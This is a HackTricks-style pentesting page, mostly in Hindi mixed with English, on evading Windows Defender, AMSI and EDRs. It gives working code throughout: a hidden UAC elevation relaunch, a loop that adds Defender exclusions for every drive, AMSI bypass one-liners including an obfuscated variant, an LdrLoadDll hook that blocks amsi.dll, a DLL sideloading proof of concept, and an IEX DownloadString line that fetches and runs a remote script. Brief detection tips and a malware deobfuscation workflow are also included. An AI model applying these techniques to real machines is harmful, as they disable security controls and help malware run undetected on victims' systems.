# Antivirus (AV) बायपास

{{#include ../banners/hacktricks-training.md}}

**यह पृष्ठ लिखा गया था** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender को रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करना बंद करने के लिए एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): Windows Defender को काम करना बंद करने के लिए एक टूल जो किसी अन्य AV की नकल करता है।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender के साथ छेड़छाड़ करने से पहले इंस्टॉलर-शैली का UAC लालच

Public loaders जो game cheats के रूप में छद्म होते हैं अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं जो पहले **उपयोगकर्ता से elevation के लिए पूछते हैं** और केवल तभी Defender को निष्क्रिय करते हैं। फ्लो सरल है:

1. Administrative context की जाँच के लिए `net session` का उपयोग करें। यह कमांड केवल तभी सफल होता है जब कॉलर के पास admin rights हों, इसलिए असफलता यह दर्शाती है कि loader एक standard user के रूप में चल रहा है।
2. तुरंत अपने आप को `RunAs` verb के साथ फिर से लॉन्च करें ताकि अपेक्षित UAC consent prompt ट्रिगर हो सके, जबकि मूल command line को संरक्षित रखा जाए।
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
पीड़ित पहले से ही मानते हैं कि वे “cracked” सॉफ़्टवेयर इंस्टॉल कर रहे हैं, इसलिए प्रम्प्ट आमतौर पर स्वीकार कर लिया जाता है, और इससे मैलवेयर को Defender की नीति बदलने के लिए आवश्यक अधिकार मिल जाते हैं।

### हर ड्राइव लेटर के लिए सर्वव्यापी `MpPreference` अपवाद

एक बार उच्चाधिकार मिलने पर, GachiLoader-style चेन सीधे सेवा को निष्क्रिय करने के बजाय Defender के ब्लाइंड स्पॉट को अधिकतम करती हैं। लोडर पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को बंद कर देता है और फिर **बेहद व्यापक बहिष्करण** लागू करता है ताकि हर उपयोगकर्ता प्रोफ़ाइल, सिस्टम निर्देशिका, और रिमूवेबल डिस्क स्कैन न किए जा सकें:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL hijacking के प्रति संवेदनशील प्रोग्रामों की सूची और वे DLL फाइलें जिन्हें वे लोड करने की कोशिश करते हैं, आउटपुट करेगा।

मैं दृढ़ता से सुझाव देता/देती हूँ कि आप **explore DLL Hijackable/Sideloadable programs yourself**, यह तकनीक सही तरीके से की जाए तो काफी stealthy होती है, लेकिन अगर आप सार्वजनिक रूप से ज्ञात DLL Sideloadable programs का उपयोग करते हैं तो आप आसानी से पकड़े जा सकते हैं।

केवल उस नाम का एक malicious DLL रख देने भर से जिससे प्रोग्राम लोड करने की उम्मीद करता है, आपका payload नहीं चलेगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ specific functions की उम्मीद करता है; इस समस्या को हल करने के लिए, हम एक और तकनीक उपयोग करेंगे जिसे **DLL Proxying/Forwarding** कहा जाता है।

**DLL Proxying** किसी प्रोग्राम द्वारा proxy (और malicious) DLL में किए गए कॉल्स को original DLL की ओर फॉरवर्ड करता है, इस तरह प्रोग्राम की कार्यक्षमता बनी रहती है और आपके payload के निष्पादन को संभाला जा सकता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग कर रहा/रही हूँ, जो [@flangvik](https://twitter.com/Flangvik/) का है।

ये वे चरण हैं जिनका मैंने पालन किया:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम कमांड हमें 2 फ़ाइलें देगा: एक DLL स्रोत कोड टेम्पलेट, और मूल रूप से नाम बदला हुआ DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे दोनों shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) और proxy DLL का [antiscan.me](https://antiscan.me) पर 0/26 Detection rate है! मैं इसे सफलता मानता हूँ।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **अत्यधिक अनुशंसा** करता हूँ कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) (DLL Sideloading के बारे में) और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें ताकि आप हमने जिन बातों पर चर्चा की है उन्हें और अधिक गहराई से समझ सकें।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules ऐसी functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: कोड को इंगित करने की बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller export को resolve करता है, Windows loader निम्न करेगा:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

समझने के लिए प्रमुख बिंदु:
- यदि `TargetDll` एक KnownDLL है, तो इसे protected KnownDLLs namespace से प्रदान किया जाता है (उदा., ntdll, kernelbase, ole32)।
- यदि `TargetDll` KnownDLL नहीं है, तो सामान्य DLL खोज क्रम उपयोग में आता है, जिसमें वह मॉड्यूल की डायरेक्टरी शामिल होती है जो forward resolution कर रहा होता है।

यह एक indirect sideloading primitive सक्षम करता है: एक signed DLL खोजें जो किसी non-KnownDLL मॉड्यूल नाम की ओर forwarded function export करता है, फिर उस signed DLL को उसी डायरेक्टरी में attacker-controlled DLL के साथ रखें जिसका नाम forwarded target module के नाम जैसा ही हो। जब forwarded export को invoke किया जाता है, loader forward को resolve करेगा और उसी डायरेक्टरी से आपका DLL लोड करेगा, और आपका DllMain execute होगा।

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` कोई KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम के माध्यम से हल किया जाता है।

PoC (copy-paste):
1) साइन किए गए system DLL को एक writable फ़ोल्डर में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक malicious `NCRYPTPROV.dll` रखें। एक minimal DllMain कोड निष्पादन प्राप्त करने के लिए पर्याप्त है; DllMain को ट्रिगर करने के लिए आपको forwarded function को implement करने की आवश्यकता नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) एक signed LOLBin के साथ forward को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
प्रेक्षित व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को लोड करता है
- जब `KeyIsoSetAuditingInterface` को रिसॉल्व किया जाता है, तो लोडर फॉरवर्ड को `NCRYPTPROV.SetAuditingInterface` की ओर फॉलो करता है
- फिर लोडर `NCRYPTPROV.dll` को `C:\test` से लोड करता है और उसका `DllMain` निष्पादित करता है
- अगर `SetAuditingInterface` लागू नहीं है, तो आपको "missing API" त्रुटि केवल तब मिलेगी जब `DllMain` पहले ही चल चुका होगा

Hunting tips:
- उन forwarded exports पर ध्यान दें जहाँ target module KnownDLL नहीं है। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध हैं।
- आप forwarded exports को निम्न tooling से enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवार खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins (e.g., rundll32.exe) द्वारा non-system paths से signed DLLs लोड करने और फिर उसी डायरेक्टरी से उसी बेस नाम वाले non-KnownDLLs लोड करने की निगरानी करें
- इन जैसी process/module chains पर अलर्ट करें: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` जो user-writable paths में हों
- Code integrity नीतियों (WDAC/AppLocker) को लागू करें और application डायरेक्टरीज़ में write+execute को अवरुद्ध करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपने shellcode को छुपे तरीके से लोड और execute करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion सिर्फ बिल्ली और चूहे का खेल है; जो आज काम करता है वह कल पता लगाया जा सकता है, इसलिए कभी भी केवल एक टूल पर निर्भर न रहें — यदि संभव हो तो कई evasion techniques को श्रृंखलाबद्ध करके आज़माएँ।

## Direct/Indirect Syscalls और SSN समाधान (SysWhispers4)

EDRs अक्सर `ntdll.dll` syscall stubs पर **user-mode inline hooks** लगाते हैं। उन hooks को बाइपास करने के लिए, आप ऐसे **direct** या **indirect** syscall stubs जनरेट कर सकते हैं जो सही **SSN** (System Service Number) लोड करते हैं और hooked export entrypoint को execute किए बिना kernel mode में transition करते हैं।

**Invocation options:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction इमिट करें (कोई `ntdll` export hit नहीं)।
- **Indirect**: मौजूद `ntdll` के अंदर किसी existing `syscall` gadget में jump करें ताकि kernel transition ऐसा दिखे जैसे वह `ntdll` से originate हो रहा हो (heuristic evasion के लिए उपयोगी); **randomized indirect** प्रति कॉल pool से एक gadget चुनता है।
- **Egg-hunt**: डिस्क पर static `0F 05` opcode sequence embed करने से बचें; runtime पर syscall sequence resolve करें।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को virtual address के अनुसार sort करके SSNs infer करें।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करें, उसकी `.text` से SSNs पढ़ें, फिर unmap करें (सभी in-memory hooks को bypass करता है)।
- **RecycledGate**: जब stub clean हो तो opcode validation के साथ VA-sorted SSN inference को combine करें; यदि hooked हो तो VA inference पर fallback करें।
- **HW Breakpoint**: `syscall` instruction पर DR0 सेट करें और hooked bytes को parse किए बिना runtime पर `EAX` से SSN capture करने के लिए VEH का उपयोग करें।

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AV केवल **files on disk** स्कैन करने में सक्षम थे, इसलिए अगर आप किसी तरह payloads **directly in-memory** निष्पादित कर पाते थे, तो AV कुछ भी करने में असमर्थ था क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus समाधानों को स्क्रिप्ट व्यवहार को इस तरह से एक्सपोज़ करने की अनुमति देता है कि स्क्रिप्ट की सामग्री unencrypted और unobfuscated हो।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को prepend करता है और फिर उस executable का path दिखाता है जिससे स्क्रिप्ट चली थी, इस केस में powershell.exe

हमने कोई फ़ाइल डिस्क पर नहीं छोड़ी, फिर भी AMSI की वजह से इन-मेमोरी पकड़े गए।

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution.इसलिए इन-मेमोरी execution के लिए lower versions of .NET (जैसे 4.7.2 या उससे नीचे) का उपयोग करने की सलाह दी जाती है अगर आप AMSI से बचना चाहते हैं।

There are a couple of ways to get around AMSI:

- **Obfuscation**

चूंकि AMSI मुख्यतः static detections पर काम करता है, इसलिये आप जो स्क्रिप्ट लोड करने की कोशिश कर रहे हैं उन्हें modify करना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI में स्क्रिप्ट्स को unobfuscate करने की क्षमता है भले ही उनपर कई layers हों, इसलिए obfuscation कैसे किया गया है उस पर निर्भर करके यह खराब विकल्प भी हो सकता है। यह इसे बचना इतना straightforward नहीं बनाता। हालांकि, कभी-कभी आपको केवल कुछ variable names बदलने की ही जरूरत होती है और आप सुरक्षित हो जाते हैं, इसलिए यह इस बात पर निर्भर करता है कि कुछ कितना flag हुआ है।

- **AMSI Bypass**

चूंकि AMSI को powershell (साथ ही cscript.exe, wscript.exe, आदि) प्रोसेस में एक DLL लोड करके implement किया गया है, इसलिए unprivileged user के रूप में भी इसके साथ आसानी से छेड़छाड़ करना संभव है। AMSI की इस implementation flaw के कारण शोधकर्ताओं ने AMSI स्कैनिंग से बचने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail करा देने (amsiInitFailed) का परिणाम यह होगा कि current process के लिए कोई scan initiate नहीं किया जाएगा। मूल रूप से इसे [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और Microsoft ने व्यापक उपयोग को रोकने के लिए एक signature विकसित किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
एक ही लाइन powershell कोड ने वर्तमान powershell प्रक्रिया के लिए AMSI को अकारगर कर दिया। यह लाइन, स्वाभाविक रूप से, AMSI द्वारा स्वयं फ्लैग कर दी गई थी, इसलिए इस तकनीक को उपयोग करने के लिए कुछ संशोधन आवश्यक है।

यहाँ एक संशोधित AMSI bypass है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> कृपया अधिक विस्तृत व्याख्या के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript और custom loaders दोनों पर काम करता है (या कोई भी चीज़ जो सामान्यतः AMSI को लोड करती)।
- लंबे command‑line अवशेषों से बचने के लिए stdin के माध्यम से scripts फीड करने के साथ जोड़ें (`PowerShell.exe -NoProfile -NonInteractive -Command -`)।
- अक्सर loaders जो LOLBins के माध्यम से execute होते हैं, द्वारा उपयोग देखा गया है (उदा., `regsvr32` जो `DllRegisterServer` कॉल करता है)।

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**पहचानी गई signature हटाएँ**

आप **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे टूल का उपयोग कर सकते हैं ताकि वर्तमान process की memory से detected AMSI signature को हटाया जा सके। यह टूल वर्तमान process की memory को AMSI signature के लिए scan करके उसे NOP instructions से overwrite करता है, जिससे वह memory से प्रभावी रूप से हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR products**

AMSI का उपयोग करने वाले AV/EDR products की सूची आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** पर पा सकते हैं।

**PowerShell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS लॉगिंग

PowerShell logging एक फीचर है जो आपको किसी सिस्टम पर executed सभी PowerShell commands को लॉग करने की अनुमति देता है। यह auditing और troubleshooting के लिए उपयोगी हो सकता है, लेकिन यह उन attackers के लिए भी एक **समस्या हो सकती है जो detection से बचना चाहते हैं**।

PowerShell लॉगिंग को bypass करने के लिए, आप निम्नलिखित तकनीकों का उपयोग कर सकते हैं:

- **PowerShell Transcription और Module Logging को डिसेबल करें**: आप इसके लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे टूल का उपयोग कर सकते हैं।
- **Powershell version 2 का उपयोग करें**: अगर आप PowerShell version 2 का उपयोग करते हैं, तो AMSI loaded नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप ऐसा कर सकते हैं: `powershell.exe -version 2`
- **Unmanaged Powershell Session का उपयोग करें**: defenses के बिना एक powershell spawn करने के लिए [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करें (यही `powerpick` है जो Cobal Strike से उपयोग करता है)।

## ऑब्फ़्यूकेशन

> [!TIP]
> कई ऑब्फ़्यूकेशन तकनीकें डेटा को encrypt करने पर निर्भर करती हैं, जो बाइनरी की entropy बढ़ा देगी और इससे AVs और EDRs के लिए इसे detect करना आसान हो जाएगा। इससे सावधान रहें और संभव हो तो encryption केवल उन specific sections पर लागू करें जो sensitive हों या जिन्हें छिपाना ज़रूरी हो।

### ConfuserEx-प्रोटेक्टेड .NET बाइनरीज़ का Deobfuscation

ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का विश्लेषण करते समय अक्सर कई protection layers मिलते हैं जो decompilers और sandboxes को ब्लॉक कर देते हैं। नीचे दिया गया workflow विश्वसनीय रूप से एक लगभग original IL **restore** करता है जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch कर देता है इसलिए कोई भी modification binary को crash कर देगा। encrypted metadata tables को locate करने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) शामिल होते हैं जो अपना unpacker बनाने में उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फ़ाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को feed करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile चुनें  
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names restore करेगा और constant strings decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को lightweight wrappers (a.k.a *proxy calls*) से replace करता है ताकि decompilation और भी टूटे। इन्हें हटाने के लिए **ProxyCall-Remover** का उपयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस स्टेप के बाद आप opaque wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` देख पाएंगे।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग की खोज करें ताकि *real* payload locate किया जा सके। अक्सर malware इसे TLV-encoded byte array के रूप में `<Module>.byte_0` के अंदर initialise करके संग्रहित करता है।

उपरोक्त chain execution flow को उस malicious sample को चलाने की ज़रूरत के बिना **restore** कर देती है – जब आप एक offline workstation पर काम कर रहे हों तो यह उपयोगी है।

🛈  ConfuserEx एक custom attribute `ConfusedByAttribute` उत्पन्न करता है जिसे IOC के रूप में samples को automatically triage करने के लिए उपयोग किया जा सकता है।

#### वन-लाइनर
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक ओपन-सोर्स फोर्क प्रदान करना है जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से सॉफ़्टवेयर सुरक्षा बढ़ा सके।
